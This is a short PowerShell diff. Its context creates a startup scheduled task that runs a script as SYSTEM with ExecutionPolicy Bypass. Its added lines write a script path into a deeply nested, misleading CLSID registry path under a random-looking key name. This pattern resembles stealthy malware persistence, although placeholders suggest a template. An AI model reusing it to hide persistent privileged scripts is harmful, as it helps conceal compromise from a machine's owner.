@@ -43,4 +43,12 @@ if (-not $taskExists) {
     # If the task doesn't exist, create it
     schtasks /create /tn $taskName /tr "powershell.exe -NoExit -ExecutionPolicy Bypass -File `"$scriptPath`"" /sc onstart /ru SYSTEM /rl HIGHEST /f
 }
+
+$basePath = '\\?\HKCU\Software\Classes\CLSID\{52061390-E7D9-4F25-B2FE-A3FDE42BFA96}\Shell\Open\Command\DelegateExecute\Cache\Backup\Runtime\Legacy\system\yXureYzQpIRLN'
+$propertyName = "YourProperty"
+$rootMonScript = "C:\YourPath\root_mon.ps1"
+
+# Use reg add to add the property
+Invoke-Expression "reg add `"$basePath`" /v `"$propertyName`" /t REG_SZ /d `"$rootMonScript`" /f"
+
 ### END
